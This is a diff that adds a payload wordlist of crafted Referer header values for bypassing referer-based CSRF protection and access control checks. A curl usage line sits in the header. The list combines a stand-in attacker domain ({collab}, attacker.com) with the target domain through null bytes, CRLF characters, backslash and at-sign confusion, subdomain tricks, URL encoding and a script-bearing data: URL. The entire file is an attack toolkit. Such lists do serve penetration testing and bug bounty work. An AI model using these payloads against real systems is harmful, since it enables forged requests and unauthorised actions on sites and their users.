@@ -1,0 +1,75 @@
+# Referer-based CSRF/Access Control Bypass Payloads
+# Replace {target} with target domain, {collab} with collaborator/attacker domain
+# Usage: curl -H "Referer: <payload>" "$TARGET/api/action"
+# Source: OWASP Testing Guide & bug bounty findings
+
+# Null byte injection
+http://{collab}%00{target}
+https://{collab}%00{target}
+
+# Query parameter injection
+http://{collab}/?d={target}
+https://{collab}/?d={target}
+http://{collab}?{target}
+https://{collab}?{target}
+
+# Fragment injection
+http://{collab}#{target}
+https://{collab}#{target}
+https://{collab}#\@{target}
+
+# Path injection
+http://{collab}/{target}
+https://{collab}/{target}
+http://{collab}///{target}
+https://{collab}///{target}
+https://{collab}/.{target}
+
+# Character injection
+https://{collab}%0A{target}
+https://{collab}%0D{target}
+https://{collab}%09{target}
+
+# Backslash/at-sign tricks
+https://{collab}\anything@{target}/
+https://{collab}\{target}/
+https://{collab}:\@@{target}
+https://{collab}\@@{target}
+https://attacker.com\anything@{target}/
+
+# Protocol/semicolon tricks
+https://{collab};https://{target}
+http://{collab};http://{target}
+
+# Subdomain tricks
+https://{target}.{collab}
+http://{target}.{collab}
+https://{target}@{collab}
+http://{target}@{collab}
+http://{target}%6D@{collab}
+
+# Dot tricks
+https://{collab}\.{target}
+https://{collab}.{target}
+
+# Empty/missing referer
+# (send request without Referer header)
+
+# Same-site with path
+https://{target}/redirect?url=https://{collab}
+https://{target}@{collab}
+
+# URL encoded variations
+https://%{collab}%00{target}
+https://{collab}%252f{target}
+https://{collab}%2f{target}
+
+# Unicode tricks
+https://{collab}%E3%80%82{target}
+https://{collab}\u002f{target}
+
+# Data URL (for JavaScript-based referer checks)
+data:text/html,<script>location='https://{target}'</script>
+
+# Meta refresh bypass
+# <meta http-equiv="refresh" content="0;url=https://{target}">
